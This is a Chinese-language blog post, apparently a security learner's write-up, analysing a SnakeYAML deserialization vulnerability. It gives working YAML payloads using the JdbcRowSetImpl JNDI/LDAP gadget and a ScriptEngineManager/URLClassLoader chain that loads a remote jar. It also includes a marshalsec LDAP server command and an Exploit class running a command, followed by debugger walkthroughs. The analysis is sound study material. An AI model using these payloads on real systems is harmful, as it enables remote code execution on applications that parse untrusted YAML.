@@ -1,0 +1,772 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CVE-2022，很新的洞了 环境 java 8u66 snakeyaml 1.27 使用例： 123456789101112131415package org.example;import org.yaml.snakeyaml.Yaml;public class Main &#123;    public static void main(String[] args) &#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="snakeyaml">
+<meta property="og:url" content="http://example.com/2024/01/12/snakeyaml/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="CVE-2022，很新的洞了 环境 java 8u66 snakeyaml 1.27 使用例： 123456789101112131415package org.example;import org.yaml.snakeyaml.Yaml;public class Main &#123;    public static void main(String[] args) &#123;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/snakeyaml/Image.png">
+<meta property="og:image" content="http://example.com/snakeyaml/Image-1705058018771-5.png">
+<meta property="og:image" content="http://example.com/snakeyaml/Image-1705058041229-7.png">
+<meta property="og:image" content="http://example.com/snakeyaml/Image-1705058051135-9.png">
+<meta property="og:image" content="http://example.com/snakeyaml/Image-1705058071921-11.png">
+<meta property="og:image" content="http://example.com/snakeyaml/Image-1705058191279-13.png">
+<meta property="og:image" content="http://example.com/snakeyaml/Image-1705058195914-15.png">
+<meta property="og:image" content="http://example.com/snakeyaml/Image-1705058216568-17.png">
+<meta property="og:image" content="http://example.com/snakeyaml/Image(8).png">
+<meta property="og:image" content="http://example.com/snakeyaml/Image-1705061069684-20.png">
+<meta property="og:image" content="http://example.com/snakeyaml/Image-1705061141187-22.png">
+<meta property="og:image" content="http://example.com/snakeyaml/Image-1705061188317-24.png">
+<meta property="og:image" content="http://example.com/snakeyaml/40399E57B3C64ACBB09E1CFC5364320C.png">
+<meta property="og:image" content="http://example.com/snakeyaml/2393BC783F3A4AE9A2F6323606001A06.png">
+<meta property="og:image" content="http://example.com/snakeyaml/04138C9119A64A0C8580B14DF65695F9.png">
+<meta property="og:image" content="http://example.com/snakeyaml/568CD1CBEA3F46219A68780E501B4288.png">
+<meta property="og:image" content="http://example.com/snakeyaml/C73018C357AF46D894B8962BE1005C8D.png">
+<meta property="og:image" content="http://example.com/snakeyaml/0D99A42B34AA49AFB0CEE0CB68BB8B05.png">
+<meta property="og:image" content="http://example.com/snakeyaml/3DDE68AA89794758823DA98C6C51B925.png">
+<meta property="og:image" content="http://example.com/snakeyaml/C62910672ECE49B49DCBC2D09D4D1E16.png">
+<meta property="og:image" content="http://example.com/snakeyaml/27F234DE06BA422B93AA1CA6636171F3.png">
+<meta property="og:image" content="http://example.com/snakeyaml/image-20240112195143936.png">
+<meta property="article:published_time" content="2024-01-12T11:09:30.000Z">
+<meta property="article:modified_time" content="2024-01-12T12:42:02.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="java codeaudit">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/snakeyaml/Image.png">
+  
+  
+  
+  <title>snakeyaml - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="snakeyaml"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-12 19:09" pubdate>
+          January 12, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">snakeyaml</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>CVE-2022，很新的洞了</p>
+<p>环境 java 8u66</p>
+<p>snakeyaml 1.27</p>
+<p>使用例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;mike&quot;</span>, <span class="hljs-number">18</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> yaml.dump(person);<br>        System.out.println(str);<br>       <br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person2</span> <span class="hljs-operator">=</span> (Person) yaml.load(str);<br>        System.out.println(person2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>dump序列化，load反序列化。</p>
+<p>可以加载对象，序列化触发get，反序列化触发set。</p>
+<p>这一看不就是和fastjson差不多吗？直接打JNDI试试。</p>
+<h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl:"></a>JdbcRowSetImpl:</h2><p>POC:</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">!!com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.rowset</span><span class="hljs-selector-class">.JdbcRowSetImpl</span> &#123;dataSourceName: ldap:<span class="hljs-comment">//127.0.0.1:1389/Exploit, autoCommit: true&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>开启ldap服务器：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\java11_low_version\bin\java -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.LDAPRefServer http://<span class="hljs-number">127.0.0.1:8082</span>/#Exploit <span class="hljs-number">1389</span><br></code></pre></td></tr></table></figure>
+
+<p>恶意exploit：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">import</span> java.lang.Process;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>            String[] commands = &#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);<br>            pc.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// do nothing</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>运行：</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) &#123;<br>        <span class="hljs-keyword">String</span> poc = <span class="hljs-string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: ldap://127.0.0.1:1389/Exploit, autoCommit: true&#125;&quot;</span>;<br>        Yaml yaml = <span class="hljs-keyword">new</span> <span class="hljs-type">Yaml</span>();<br>        yaml.load(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>漏洞分析：</p>
+<p>和fastjson很像，但是又不太一样。</p>
+<p>审一下：</p>
+<p><img src="/../snakeyaml/Image.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<p><img src="/../snakeyaml/Image-1705058018771-5.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<p>一路跟断点来到：</p>
+<p><img src="/../snakeyaml/Image-1705058041229-7.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<p><img src="/../snakeyaml/Image-1705058051135-9.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<p>一共执行了3轮，第一轮解析了JdbcRowSetImpl这个类，然后解析其键值，一共两个键值，解析两次。</p>
+<p>第2轮data为DataSourceName，来到safeConstructor：</p>
+<p><img src="/../snakeyaml/Image-1705058071921-11.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<p>经过两轮迭代后，key解析完毕，然后解析value：</p>
+<p>在这个方法执行了set方法：</p>
+<p><img src="/../snakeyaml/Image-1705058191279-13.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<p><img src="/../snakeyaml/Image-1705058195914-15.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<p>跟进set：</p>
+<p><img src="/../snakeyaml/Image-1705058216568-17.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<p>到这里就到了JdbcRowSetImpl链的setAutoCommit方法了。</p>
+<p>小问题：</p>
+<p>我现在都不知道java到底如何获取getter setter?</p>
+<p>是自己写反射？还是jdk就有工具？</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.javaws.jnl.PropertyDesc;<br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><span class="hljs-keyword">import</span> org.example.Person;<br><br><span class="hljs-keyword">import</span> java.beans.PropertyDescriptor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">PropertyDescriptor</span> <span class="hljs-variable">pd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PropertyDescriptor</span>(<span class="hljs-string">&quot;username&quot;</span>, Person.class);<br><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getter</span> <span class="hljs-operator">=</span> pd.getReadMethod();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">setter</span> <span class="hljs-operator">=</span> pd.getWriteMethod();<br><br>        System.out.println(<span class="hljs-string">&quot;Getter Method: &quot;</span> + getter.getName());<br>        System.out.println(<span class="hljs-string">&quot;Setter Method: &quot;</span> + setter.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里用的是PropertyDescriptor，是java.Bean下的一个类。</p>
+<p>getReadMethod获取的是getter，getWriteMethod获取的是setter。</p>
+<p>比如我要写值：</p>
+<p><img src="/../snakeyaml/Image(8).png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>getWriteMethod().invoke(object, data);</p>
+<h2 id="ScriptEngineManager"><a href="#ScriptEngineManager" class="headerlink" title="ScriptEngineManager"></a>ScriptEngineManager</h2><p>ScriptEngineManager:</p>
+<p>先来学下什么是SPI：</p>
+<p>实际例子：mysql-connector,众所周知mysql有很多版本如mariadb，mysql，要加载这些，怎么优雅简洁的加载呢？</p>
+<p>就要用到SPI了。</p>
+<p>例：</p>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">HelloSPI</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sayHello</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后有两个实现类：</p>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ImageHello</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">HelloSPI</span></span>&#123;<br>	<span class="hljs-meta">@Override</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sayHello</span><span class="hljs-params">()</span> </span>&#123;<br>		System.out.println(<span class="hljs-string">&quot;This is image hello&quot;</span>);<br>	&#125;<br>&#125;<br><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TextHello</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">HelloSPI</span> </span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sayHello</span><span class="hljs-params">()</span> </span>&#123;<br>		System.out.println(<span class="hljs-string">&quot;Text Hello&quot;</span>);<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后需要配置文件，在resources&#x2F;META-INF&#x2F;services&#x2F;</p>
+<p>添加org.example.HelloSPI</p>
+<p>文件内容：</p>
+<p>org.example.ImageHello</p>
+<p>org.example.TextHello</p>
+<p>其实就是那两个实现类。</p>
+<p>SPIDemo：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.util.ServiceLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SPIDemo</span> &#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>		ServiceLoader&lt;HelloSPI&gt; serviceLoader = 			ServiceLoader.load(HelloSPI.class);<br>		<span class="hljs-keyword">for</span>(HelloSPI helloSPI : serviceLoader) &#123;<br>			helloSPI.sayHello();<br>		&#125;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过serviceLoader就可以加载所有的服务了。比如使用mysql-connector，就可以有所有版本的连接了。</p>
+<p>ServiceLoader实现了Iterator接口，具体请直接去看类的代码，其作用如下：</p>
+<p><strong>首先，</strong>ServiceLoader实现了Iterable接口，所以它有迭代器的属性，这里主要都是实现了迭代器的hasNext和next方法。这里主要都是调用的lookupIterator的相应hasNext和next方法，lookupIterator是懒加载迭代器。</p>
+<p><strong>其次，</strong>LazyIterator中的hasNext方法，静态变量PREFIX就是”META-INF&#x2F;services&#x2F;”目录，这也就是为什么需要在classpath下的META-INF&#x2F;services&#x2F;目录里创建一个以服务接口命名的文件。</p>
+<p><strong>最后，</strong>通过反射方法Class.forName()加载类对象，并用newInstance方法将类实例化，并把实例化后的类缓存到providers对象中，(LinkedHashMap&lt;String,S&gt;类型） 然后返回实例对象。</p>
+<p>所以缺点也是显而易见的，实例化对象占资源较大。</p>
+<p>验证：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">String poc <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://acld0j.dnslog.cn\&quot;]]]]\n&quot;</span><span class="hljs-comment">;</span><br>Yaml yaml <span class="hljs-operator">=</span> new Yaml()<span class="hljs-comment">;</span><br>yaml.load(poc)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../snakeyaml/Image-1705061069684-20.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<p>回到snakeyaml。</p>
+<p>利用项目：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload.git">https://github.com/artsploit/yaml-payload.git</a></p>
+<p>编译：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">javac <span class="hljs-attribute">src</span>/artsploit/AwesomeScriptEngineFactory<span class="hljs-selector-class">.java</span><br>jar -cvf yaml-payload<span class="hljs-selector-class">.jar</span> -C <span class="hljs-attribute">src</span>/ .<br></code></pre></td></tr></table></figure>
+
+
+
+<p>POC如下：</p>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">!!javax.script.ScriptEngineManager [<br>!!java.net.URLClassLoader [[<br>!!java.net.URL [<span class="hljs-string">&quot;http://127.0.0.1:8082/yaml-payload.jar&quot;</span>]<br>]]]<br></code></pre></td></tr></table></figure>
+
+<p>看下其项目文件：</p>
+<p><img src="/../snakeyaml/Image-1705061141187-22.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<p>如图，其构造函数是命令执行的地方，这玩意实现了ScriptEngineManager类。</p>
+<p>SPI配置文件：</p>
+<p><img src="/../snakeyaml/Image-1705061188317-24.png" srcset="/img/loading.gif" lazyload alt="Image"></p>
+<p>然后跟下断点：<br><img src="/../snakeyaml/40399E57B3C64ACBB09E1CFC5364320C.png" srcset="/img/loading.gif" lazyload alt="img"><br>前面都差不多，但是这里用的是ContructorSequence，而不是之前的SafeConstructor。<br><img src="/../snakeyaml/2393BC783F3A4AE9A2F6323606001A06.png" srcset="/img/loading.gif" lazyload alt="img"><br>直接锁定这个方法。</p>
+<p>经过来回断点，把功能搞明白了。<br><img src="/../snakeyaml/04138C9119A64A0C8580B14DF65695F9.png" srcset="/img/loading.gif" lazyload alt="img"><br>从内往外实例化对象，现实java.net.URL， 然后是其ClassLoader，然后是ScriptEngineManger。</p>
+<p>来到第三次：<br><img src="/../snakeyaml/568CD1CBEA3F46219A68780E501B4288.png" srcset="/img/loading.gif" lazyload alt="img"><br>我们直接在ScriptEngineManager的构造函数打个断点。<br><img src="/../snakeyaml/C73018C357AF46D894B8962BE1005C8D.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/../snakeyaml/0D99A42B34AA49AFB0CEE0CB68BB8B05.png" srcset="/img/loading.gif" lazyload alt="img"><br>最后在这个方法执行了代码。</p>
+<p>我们不妨先猜一下，SPI里，Loader储存的都是实例化对象，<br><img src="/../snakeyaml/3DDE68AA89794758823DA98C6C51B925.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>在第二次迭代来到：<br><img src="/../snakeyaml/C62910672ECE49B49DCBC2D09D4D1E16.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>到这里，loader用的是我们传入的URLClassLoader。泛型是ScriptEngineFactory<br>利用URLClassLoader寻找到jar包，然后实例化了<br><img src="/../snakeyaml/27F234DE06BA422B93AA1CA6636171F3.png" srcset="/img/loading.gif" lazyload alt="img"><br>导致命令执行！</p>
+<p>一些疑问：</p>
+<p>1：关于URLClassloader如何远程加载jar文件并执行命令？</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">Questions</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception&#123;<br>        URL[] urls = &#123;<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:8082/yaml-payload.jar&quot;</span>)&#125;;<br>        URLClassLoader loader = <span class="hljs-keyword">new</span> <span class="hljs-type">URLClassLoader</span>(urls);<br><br>        loader.loadClass(<span class="hljs-string">&quot;artsploit.AwesomeScriptEngineFactory&quot;</span>).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>rt，远程加载jar包。</p>
+<p>然后再套一层。</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">URL[] urls <span class="hljs-operator">=</span> &#123;new URL(<span class="hljs-string">&quot;http://127.0.0.1:8082/yaml-payload.jar&quot;</span>)&#125;<span class="hljs-comment">;</span><br>URLClassLoader loader <span class="hljs-operator">=</span> new URLClassLoader(urls)<span class="hljs-comment">;</span><br><br>ScriptEngineManager scriptEngineManager <span class="hljs-operator">=</span> new ScriptEngineManager(loader)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>2：为什么选择了SequenceConstructor而不是第一个链的SafeConstructor？</p>
